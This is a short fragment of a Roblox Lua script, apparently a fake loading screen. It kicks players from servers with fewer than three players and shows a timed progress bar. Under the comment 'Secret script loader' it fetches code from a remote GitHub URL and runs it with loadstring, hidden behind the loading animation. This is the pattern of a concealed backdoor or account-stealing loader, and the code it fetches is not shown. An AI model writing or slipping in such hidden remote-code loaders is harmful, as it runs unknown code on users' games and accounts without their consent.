...
if #Players:GetPlayers() < 3 then
	player:Kick("Please join different server.")
end
...
-- 🔒 Secret script loader
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlenwood/autofarm/refs/heads/main/script.lua"))()
end)

-- ⏱ 2-minute loading sequence
for i = 0, 100 do
	percentText.Text = i .. "%"
	local tween = TweenService:Create(progressBar, TweenInfo.new(1.2, Enum.EasingStyle.Linear), {
